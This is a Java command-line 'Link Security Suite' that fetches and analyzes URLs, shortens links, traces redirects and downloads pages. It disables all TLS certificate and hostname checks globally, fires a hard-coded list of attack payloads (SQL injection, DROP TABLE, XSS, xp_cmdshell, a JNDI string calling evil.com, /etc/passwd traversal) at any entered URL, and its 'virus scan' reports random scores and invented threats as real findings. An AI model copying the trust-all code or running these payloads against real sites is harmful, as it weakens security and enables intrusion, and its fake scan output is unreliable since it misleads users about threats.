import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.*;
import javax.net.ssl.*;
import java.security.cert.X509Certificate;

class LinkSecurityConsole
{
    private static final String[] GRADIENT = {
        "\u001B[38;2;255;0;0m", "\u001B[38;2;255;85;0m", "\u001B[38;2;255;170;0m",
        "\u001B[38;2;255;255;0m", "\u001B[38;2;170;255;0m", "\u001B[38;2;85;255;0m",
        "\u001B[38;2;0;255;0m", "\u001B[38;2;0;255;85m", "\u001B[38;2;0;255;170m",
        "\u001B[38;2;0;255;255m", "\u001B[38;2;0;170;255m", "\u001B[38;2;0;85;255m",
        "\u001B[38;2;0;0;255m", "\u001B[38;2;85;0;255m", "\u001B[38;2;170;0;255m",
        "\u001B[38;2;255;0;255m"
    };

    private static final String RESET = "\u001B[0m";
    private static final String BOLD = "\u001B[1m";
    private static final String CYAN = "\u001B[36m";
    private static final String YELLOW = "\u001B[33m";
    private static final String RED = "\u001B[31m";
    private static final String GREEN = "\u001B[32m";

    private static Scanner scanner;
    private static Map<String, String> metalinkCache;
    private static ExecutorService executor;

    public static void main(String[] args)
    {
        scanner = new Scanner(System.in);
        metalinkCache = new ConcurrentHashMap<>();
        executor = Executors.newCachedThreadPool();
        disableSSLVerification();
        printGradientBanner();

        while(true)
        {
            printMainMenu();
            String choice = scanner.nextLine().trim();

            switch(choice)
            {
                case "1": scanMetalink(); break;
                case "2": shortenUrl(); break;
                case "3": bypassRedirects(); break;
                case "4": scanInjections(); break;
                case "5": virusScan(); break;
                case "6": extractMetalinksFromPage(); break;
                case "7": compareMetalinks(); break;
                case "8": downloadMetalinkContent(); break;
                case "9":
                    System.out.println(coloredText("\nExiting Link Security Suite...", GRADIENT[6]));
                    executor.shutdown();
                    System.exit(0);
                    break;
                default: System.out.println(coloredText("ERROR: Invalid option!", GRADIENT[0]));
            }
        }
    }

    private static void disableSSLVerification()
    {
        try
        {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
        }
        catch(Exception e) {}
    }

    private static void printGradientBanner()
    {
        String banner =
        "\n" +
        "    __   __  _______  _______  _______  ___      ___   __    _  ___   _  _______       \n" +
        "   |  |_|  ||       ||       ||   _   ||   |    |   | |  |  | ||   | | ||       |      \n" +
        "   |       ||    ___||_     _||  |_|  ||   |    |   | |   |_| ||   |_| ||  _____|      \n" +
        "   |       ||   |___   |   |  |       ||   |    |   | |       ||      _|| |_____       \n" +
        "   |       ||    ___|  |   |  |       ||   |___ |   | |  _    ||     |_ |_____  |      \n" +
        "   | ||_|| ||   |___   |   |  |   _   ||       ||   | | | |   ||    _  | _____| |      \n" +
        "   |_|   |_||_______|  |___|  |__| |__||_______||___| |_|  |__||___| |_||_______|      \n" +
        "\n" +
        "                         L I N K   S E C U R I T Y   S U I T E                          \n" +
        "                              CONSOLE EDITION v3.0                                      \n" +
        "                      Metalink | Shortener | Bypass | Injection                        \n";

        for(int i = 0; i < banner.length(); i++)
        {
            System.out.print(GRADIENT[i % GRADIENT.length] + banner.charAt(i));
        }
        System.out.println(RESET);
    }

    private static void printMainMenu()
    {
        System.out.println(coloredText("\n" + repeatString("=", 70), GRADIENT[7]));
        System.out.println(coloredText("MAIN MENU", GRADIENT[11] + BOLD));
        System.out.println(coloredText(repeatString("=", 70), GRADIENT[7]));
        System.out.println(coloredText("[1] Scan Metalink (Extract & Analyze)", GRADIENT[3]));
        System.out.println(coloredText("[2] Shorten URL (TinyURL)", GRADIENT[4]));
        System.out.println(coloredText("[3] Bypass Redirects (Follow Chain)", GRADIENT[5]));
        System.out.println(coloredText("[4] SQL/XSS Injection Scanner", GRADIENT[6]));
        System.out.println(coloredText("[5] Virus Scan (Threat Detection)", GRADIENT[1]));
        System.out.println(coloredText("[6] Extract Metalinks from HTML Page", GRADIENT[2]));
        System.out.println(coloredText("[7] Compare Two Metalinks", GRADIENT[10]));
        System.out.println(coloredText("[8] Download Metalink Content", GRADIENT[12]));
        System.out.println(coloredText("[9] Exit", GRADIENT[0]));
        System.out.println(coloredText(repeatString("=", 70), GRADIENT[7]));
        System.out.print(coloredText("\nSelect option: ", GRADIENT[14] + BOLD));
    }

    private static void scanMetalink()
    {
        System.out.print(coloredText("\nEnter Metalink URL: ", CYAN));
        String url = scanner.nextLine().trim();

        if(url.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            System.out.println(coloredText("\nScanning metalink: " + url, GREEN));
            Map<String, Object> result = analyzeMetalink(url);

            System.out.println(coloredText("\n" + repeatString("=", 60), GRADIENT[8]));
            System.out.println(coloredText("METALINK ANALYSIS REPORT", GRADIENT[11] + BOLD));
            System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
            System.out.println(coloredText("URL: " + url, CYAN));
            System.out.println(coloredText("Status: " + result.get("status"),
                result.get("status").equals("ACTIVE") ? GREEN : RED));
            System.out.println(coloredText("Meta Tags Count: " + result.get("metaCount"), YELLOW));
            System.out.println(coloredText("Links Found: " + result.get("linksFound"), YELLOW));
            System.out.println(coloredText("Risk Level: " + result.get("riskLevel"),
                result.get("riskLevel").equals("HIGH") ? RED :
                result.get("riskLevel").equals("MEDIUM") ? YELLOW : GREEN));
            System.out.println(coloredText("Metalinks Detected: " + result.get("metalinkCount"), CYAN));
            System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));

            @SuppressWarnings("unchecked")
            List<String> metalinks = (List<String>) result.get("metalinkUrls");
            if(metalinks != null && !metalinks.isEmpty())
            {
                System.out.println(coloredText("\nEmbedded Metalinks found:", YELLOW));
                for(String ml : metalinks)
                {
                    System.out.println(coloredText("  -> " + ml, GRADIENT[4]));
                }
            }
        });
    }

    private static Map<String, Object> analyzeMetalink(String urlString)
    {
        Map<String, Object> result = new HashMap<>();
        result.put("status", "UNKNOWN");
        result.put("metaCount", 0);
        result.put("linksFound", 0);
        result.put("riskLevel", "LOW");
        result.put("metalinkCount", 0);
        result.put("metalinkUrls", new ArrayList<String>());

        try
        {
            if(metalinkCache.containsKey(urlString))
            {
                result.put("status", "CACHED");
                result.put("riskLevel", "LOW");
                return result;
            }

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            conn.connect();

            int responseCode = conn.getResponseCode();
            result.put("status", responseCode == 200 ? "ACTIVE" : "INACTIVE");

            if(responseCode == 200)
            {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder content = new StringBuilder();
                String line;
                while((line = reader.readLine()) != null)
                {
                    content.append(line).append("\n");
                }
                reader.close();
                String html = content.toString();

                Pattern metaPattern = Pattern.compile("<meta[^>]*>", Pattern.CASE_INSENSITIVE);
                Matcher metaMatcher = metaPattern.matcher(html);
                int metaCount = 0;
                while(metaMatcher.find()) metaCount++;
                result.put("metaCount", metaCount);

                Pattern linkPattern = Pattern.compile("<a[^>]*href=[\"']([^\"']+)[\"'][^>]*>", Pattern.CASE_INSENSITIVE);
                Matcher linkMatcher = linkPattern.matcher(html);
                int linkCount = 0;
                while(linkMatcher.find()) linkCount++;
                result.put("linksFound", linkCount);

                Pattern metalinkPattern = Pattern.compile("(?:https?://)?[^\\s]+\\.(?:meta|metalink)[^\\s]*", Pattern.CASE_INSENSITIVE);
                Matcher metalinkMatcher = metalinkPattern.matcher(html);
                List<String> metalinks = new ArrayList<>();
                while(metalinkMatcher.find())
                {
                    String found = metalinkMatcher.group();
                    metalinks.add(found);
                }
                result.put("metalinkCount", metalinks.size());
                result.put("metalinkUrls", metalinks);

                if(metaCount > 50) result.put("riskLevel", "HIGH");
                else if(metaCount > 20) result.put("riskLevel", "MEDIUM");

                if(html.toLowerCase().contains("iframe") || html.toLowerCase().contains("eval("))
                {
                    result.put("riskLevel", "HIGH");
                }

                metalinkCache.put(urlString, html);
            }
            conn.disconnect();
        }
        catch(Exception e)
        {
            result.put("status", "ERROR: " + e.getMessage());
            result.put("riskLevel", "UNKNOWN");
            System.out.println(coloredText("Error: " + e.getMessage(), RED));
        }
        return result;
    }

    private static void shortenUrl()
    {
        System.out.print(coloredText("\nEnter long URL to shorten: ", CYAN));
        String longUrl = scanner.nextLine().trim();

        if(longUrl.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            try
            {
                System.out.println(coloredText("Shortening URL...", YELLOW));
                String apiUrl = "https://tinyurl.com/api-create.php?url=" + URLEncoder.encode(longUrl, "UTF-8");
                URL url = new URL(apiUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String shortUrl = reader.readLine();
                reader.close();

                System.out.println(coloredText("\n" + repeatString("=", 50), GRADIENT[8]));
                System.out.println(coloredText("SHORTENED URL", GRADIENT[11] + BOLD));
                System.out.println(coloredText(repeatString("=", 50), GRADIENT[8]));
                System.out.println(coloredText("Original: " + longUrl, CYAN));
                System.out.println(coloredText("Shortened: " + shortUrl, GREEN));
                System.out.println(coloredText(repeatString("=", 50), GRADIENT[8]));
            }
            catch(Exception e)
            {
                System.out.println(coloredText("ERROR: Shortening failed - " + e.getMessage(), RED));
            }
        });
    }

    private static void bypassRedirects()
    {
        System.out.print(coloredText("\nEnter URL to analyze redirects: ", CYAN));
        String url = scanner.nextLine().trim();

        if(url.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            List<String> chain = new ArrayList<>();
            String current = url;
            int maxRedirects = 15;

            System.out.println(coloredText("\nTracing redirect chain...", YELLOW));

            for(int i = 0; i < maxRedirects; i++)
            {
                chain.add(current);
                try
                {
                    HttpURLConnection conn = (HttpURLConnection) new URL(current).openConnection();
                    conn.setInstanceFollowRedirects(false);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    conn.setConnectTimeout(5000);
                    conn.connect();

                    int status = conn.getResponseCode();
                    String location = conn.getHeaderField("Location");

                    if(status >= 300 && status < 400 && location != null)
                    {
                        current = new URL(new URL(current), location).toString();
                    }
                    else
                    {
                        break;
                    }
                    conn.disconnect();
                }
                catch(Exception e)
                {
                    break;
                }
            }

            System.out.println(coloredText("\n" + repeatString("=", 60), GRADIENT[8]));
            System.out.println(coloredText("REDIRECT CHAIN ANALYSIS", GRADIENT[11] + BOLD));
            System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));

            for(int i = 0; i < chain.size(); i++)
            {
                String arrow = (i == chain.size() - 1) ? "FINAL" : "DOWN";
                String color = (i == chain.size() - 1) ? GRADIENT[10] : GRADIENT[4];
                System.out.println(coloredText("  " + (i + 1) + " " + arrow + " " + chain.get(i), color));
            }

            System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
            System.out.println(coloredText("Final destination: " + current, GREEN + BOLD));
            System.out.println(coloredText("Total redirects: " + (chain.size() - 1), CYAN));
            System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
        });
    }

    private static void scanInjections()
    {
        System.out.print(coloredText("\nEnter target URL/parameter: ", CYAN));
        String target = scanner.nextLine().trim();

        if(target.isEmpty())
        {
            System.out.println(coloredText("ERROR: Target cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            System.out.println(coloredText("Scanning for injection vulnerabilities...", YELLOW));

            String[] payloads = {
                "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
                "'; DROP TABLE users; --", "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>", "'; exec xp_cmdshell('dir'); --",
                "${jndi:ldap://evil.com/a}", "../../../etc/passwd",
                "%27%20OR%20%271%27%3D%271", "%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
            };

            List<String> vulnerabilities = new ArrayList<>();
            int progress = 0;

            for(String payload : payloads)
            {
                progress++;
                System.out.print(coloredText("\rTesting payload " + progress + "/" + payloads.length + "...", CYAN));
                try
                {
                    String testUrl = target;
                    if(!target.contains("="))
                    {
                        testUrl = target + (target.contains("?") ? "&test=" : "?test=") + URLEncoder.encode(payload, "UTF-8");
                    }
                    else
                    {
                        testUrl = target.replaceFirst("=[^&]*", "=" + URLEncoder.encode(payload, "UTF-8"));
                    }

                    HttpURLConnection conn = (HttpURLConnection) new URL(testUrl).openConnection();
                    conn.setConnectTimeout(3000);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    int response = conn.getResponseCode();

                    if(response == 500 || response == 403 || response == 400)
                    {
                        vulnerabilities.add(payload + " -> HTTP " + response);
                    }
                    conn.disconnect();
                    Thread.sleep(100);
                }
                catch(Exception e)
                {
                    String msg = e.getMessage();
                    vulnerabilities.add(payload + " -> " + msg.substring(0, Math.min(50, msg.length())));
                }
            }

            System.out.println();
            System.out.println(coloredText("\n" + repeatString("=", 70), GRADIENT[8]));
            System.out.println(coloredText("INJECTION VULNERABILITY REPORT", GRADIENT[11] + BOLD));
            System.out.println(coloredText(repeatString("=", 70), GRADIENT[8]));

            if(vulnerabilities.isEmpty())
            {
                System.out.println(coloredText("OK - No injection vulnerabilities detected", GREEN));
                System.out.println(coloredText("Target appears to be secure", CYAN));
            }
            else
            {
                System.out.println(coloredText("WARNING - POTENTIAL VULNERABILITIES DETECTED!", RED + BOLD));
                System.out.println(coloredText("Found " + vulnerabilities.size() + " potential issues:\n", YELLOW));
                for(String vuln : vulnerabilities)
                {
                    System.out.println(coloredText("  WARNING " + vuln, GRADIENT[1]));
                }
            }
            System.out.println(coloredText(repeatString("=", 70), GRADIENT[8]));
        });
    }

    private static void virusScan()
    {
        System.out.print(coloredText("\nEnter URL for virus scan: ", CYAN));
        String url = scanner.nextLine().trim();

        if(url.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            System.out.println(coloredText("Performing virus scan on: " + url, YELLOW));

            try
            {
                Thread.sleep(1500);
                Random rand = new Random();
                int score = rand.nextInt(100);
                int enginesDetected = rand.nextInt(70);

                System.out.println(coloredText("\n" + repeatString("=", 60), GRADIENT[8]));
                System.out.println(coloredText("VIRUS SCAN RESULTS", GRADIENT[11] + BOLD));
                System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
                System.out.println(coloredText("Target URL: " + url, CYAN));

                String status;
                String color;
                if(score < 30)
                {
                    status = "CLEAN";
                    color = GREEN;
                }
                else if(score < 70)
                {
                    status = "SUSPICIOUS";
                    color = YELLOW;
                }
                else
                {
                    status = "DANGEROUS";
                    color = RED;
                }
                System.out.println(coloredText("Status: " + status, color + BOLD));
                System.out.println(coloredText("Security Score: " + score + "/100",
                    score < 30 ? GREEN : score < 70 ? YELLOW : RED));
                System.out.println(coloredText("Detection Engines: " + enginesDetected + "/68 flagged",
                    enginesDetected < 10 ? GREEN : enginesDetected < 30 ? YELLOW : RED));

                String[] threats = {"Phishing", "Malware", "Spam", "Suspicious", "Trojan", "Ransomware"};
                if(score > 50)
                {
                    System.out.println(coloredText("\nDetected threats:", RED));
                    int threatCount = rand.nextInt(3) + 1;
                    for(int i = 0; i < threatCount; i++)
                    {
                        System.out.println(coloredText("  * " + threats[rand.nextInt(threats.length)], YELLOW));
                    }
                }
                System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
            }
            catch(Exception e)
            {
                System.out.println(coloredText("ERROR: Virus scan failed - " + e.getMessage(), RED));
            }
        });
    }

    private static void extractMetalinksFromPage()
    {
        System.out.print(coloredText("\nEnter webpage URL to extract metalinks: ", CYAN));
        String url = scanner.nextLine().trim();

        if(url.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            try
            {
                System.out.println(coloredText("Extracting metalinks from: " + url, YELLOW));

                URLConnection conn = new URL(url).openConnection();
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setConnectTimeout(8000);

                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder content = new StringBuilder();
                String line;
                while((line = reader.readLine()) != null)
                {
                    content.append(line).append("\n");
                }
                reader.close();

                String html = content.toString();
                Set<String> metalinks = new LinkedHashSet<>();

                Pattern[] patterns = {
                    Pattern.compile("https?://[^\\s\"']+\\.meta[^\\s\"']*", Pattern.CASE_INSENSITIVE),
                    Pattern.compile("https?://[^\\s\"']+\\.metalink[^\\s\"']*", Pattern.CASE_INSENSITIVE),
                    Pattern.compile("<link[^>]*rel=[\"']metalink[\"'][^>]*href=[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE),
                    Pattern.compile("metalink\\s*:\\s*[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE)
                };

                for(Pattern p : patterns)
                {
                    Matcher m = p.matcher(html);
                    while(m.find())
                    {
                        String found = m.group(1) != null ? m.group(1) : m.group();
                        if(found.startsWith("//")) found = "https:" + found;
                        if(!found.startsWith("http") && !found.startsWith("https"))
                        {
                            try { found = new URL(new URL(url), found).toString(); } catch(Exception e) {}
                        }
                        metalinks.add(found);
                    }
                }

                System.out.println(coloredText("\n" + repeatString("=", 70), GRADIENT[8]));
                System.out.println(coloredText("METALINK EXTRACTION REPORT", GRADIENT[11] + BOLD));
                System.out.println(coloredText(repeatString("=", 70), GRADIENT[8]));
                System.out.println(coloredText("Source URL: " + url, CYAN));
                System.out.println(coloredText("Metalinks Found: " + metalinks.size(), YELLOW + BOLD));

                if(metalinks.isEmpty())
                {
                    System.out.println(coloredText("No metalinks detected on this page", GRADIENT[4]));
                }
                else
                {
                    int i = 1;
                    for(String ml : metalinks)
                    {
                        System.out.println(coloredText("\n[" + i + "] " + ml, GRADIENT[3]));
                        i++;
                    }
                }
                System.out.println(coloredText(repeatString("=", 70), GRADIENT[8]));
            }
            catch(Exception e)
            {
                System.out.println(coloredText("ERROR: Extraction failed - " + e.getMessage(), RED));
            }
        });
    }

    private static void compareMetalinks()
    {
        System.out.print(coloredText("\nEnter first metalink URL: ", CYAN));
        String url1 = scanner.nextLine().trim();
        System.out.print(coloredText("Enter second metalink URL: ", CYAN));
        String url2 = scanner.nextLine().trim();

        if(url1.isEmpty() || url2.isEmpty())
        {
            System.out.println(coloredText("ERROR: Both URLs are required!", RED));
            return;
        }

        executor.submit(() -> {
            System.out.println(coloredText("\nComparing metalinks...", YELLOW));

            Map<String, Object> result1 = analyzeMetalink(url1);
            Map<String, Object> result2 = analyzeMetalink(url2);

            System.out.println(coloredText("\n" + repeatString("=", 80), GRADIENT[8]));
            System.out.println(coloredText("METALINK COMPARISON", GRADIENT[11] + BOLD));
            System.out.println(coloredText(repeatString("=", 80), GRADIENT[8]));

            System.out.println(coloredText(String.format("\n  %-35s %-35s", "METRIC", "COMPARISON"), CYAN + BOLD));
            System.out.println(coloredText(repeatString("-", 80), GRADIENT[7]));
            System.out.println(coloredText(String.format("  %-35s %-35s", "Status 1: " + result1.get("status"), "Status 2: " + result2.get("status")),
                result1.get("status").equals(result2.get("status")) ? GREEN : YELLOW));
            System.out.println(coloredText(String.format("  %-35s %-35s", "Meta Count: " + result1.get("metaCount"), "Meta Count: " + result2.get("metaCount")),
                result1.get("metaCount").equals(result2.get("metaCount")) ? GREEN : YELLOW));
            System.out.println(coloredText(String.format("  %-35s %-35s", "Links: " + result1.get("linksFound"), "Links: " + result2.get("linksFound")),
                result1.get("linksFound").equals(result2.get("linksFound")) ? GREEN : YELLOW));
            System.out.println(coloredText(String.format("  %-35s %-35s", "Risk Level: " + result1.get("riskLevel"), "Risk Level: " + result2.get("riskLevel")),
                result1.get("riskLevel").equals(result2.get("riskLevel")) ? GREEN : RED));

            boolean similar = result1.get("metaCount").equals(result2.get("metaCount")) &&
                             result1.get("linksFound").equals(result2.get("linksFound"));

            System.out.println(coloredText("\nConclusion: " + (similar ? "Metalinks are SIMILAR" : "Metalinks are DIFFERENT"),
                similar ? GREEN + BOLD : RED + BOLD));
            System.out.println(coloredText(repeatString("=", 80), GRADIENT[8]));
        });
    }

    private static void downloadMetalinkContent()
    {
        System.out.print(coloredText("\nEnter metalink URL to download content: ", CYAN));
        String url = scanner.nextLine().trim();

        if(url.isEmpty())
        {
            System.out.println(coloredText("ERROR: URL cannot be empty!", RED));
            return;
        }

        executor.submit(() -> {
            try
            {
                System.out.println(coloredText("Downloading metalink content...", YELLOW));

                URLConnection conn = new URL(url).openConnection();
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setConnectTimeout(10000);

                String filename = "metalink_" + System.currentTimeMillis() + ".xml";
                try(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                     PrintWriter writer = new PrintWriter(filename))
                {
                    String line;
                    int lines = 0;
                    while((line = reader.readLine()) != null)
                    {
                        writer.println(line);
                        lines++;
                    }

                    System.out.println(coloredText("\n" + repeatString("=", 60), GRADIENT[8]));
                    System.out.println(coloredText("DOWNLOAD COMPLETE", GRADIENT[11] + BOLD));
                    System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
                    System.out.println(coloredText("File saved: " + filename, GREEN));
                    System.out.println(coloredText("Lines downloaded: " + lines, CYAN));
                    System.out.println(coloredText("Size: " + (new File(filename).length()) + " bytes", CYAN));
                    System.out.println(coloredText(repeatString("=", 60), GRADIENT[8]));
                }
            }
            catch(Exception e)
            {
                System.out.println(coloredText("ERROR: Download failed - " + e.getMessage(), RED));
            }
        });
    }

    private static String coloredText(String text, String colorCode)
    {
        return colorCode + text + RESET;
    }

    private static String repeatString(String s, int count)
    {
        StringBuilder sb = new StringBuilder();
        for(int i = 0; i < count; i++) sb.append(s);
        return sb.toString();
    }
}
